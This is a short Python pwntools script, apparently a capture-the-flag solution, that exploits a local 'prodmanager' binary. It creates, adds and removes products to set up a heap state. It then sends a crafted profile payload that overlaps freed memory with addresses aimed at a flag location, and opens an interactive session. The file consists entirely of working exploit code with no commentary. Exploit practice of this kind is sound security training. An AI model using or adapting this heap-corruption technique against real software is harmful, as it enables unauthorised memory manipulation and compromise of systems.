from pwn import *

def create(name, price):
	p.recvuntil("Input: ")
	p.sendline("1")
	p.recvuntil("Enter product name: ")
	p.sendline(name)
	p.recvuntil("Enter product price: ")
	p.sendline(str(price))

def remove(name):
	p.recvuntil("Input: ")
	p.sendline("2")
	p.recvuntil("Which product name would you like to remove: ")
	p.sendline(name)

def add(name):
	p.recvuntil("Input: ")
	p.sendline("3")
	p.recvuntil("Which product name would you like to add: ")
	p.sendline(name)

def profile(data):
	p.recvuntil("Input: ")
	p.sendline("5")
	p.recvuntil("Creating profile!\n")
	p.sendline(data)

if __name__ == '__main__':
	flag = 0x0804C3E0 - 24
	p = process("./prodmanager")
	context.log_level='debug'
	
	create("AAAA", 2)
	create("BBBB", 3)
	create("CCCC", 1)
	create("DDDD", 2)

	add("AAAA")
	add("BBBB")
	add("CCCC")
	add("DDDD")

	remove("DDDD")

	profile(p32(1) + p32(flag)*2 + p32(0) + p32(flag)*2)

	p.recvuntil("Input: ")
	p.sendline("4")
	sleep(1)
	p.interactive()
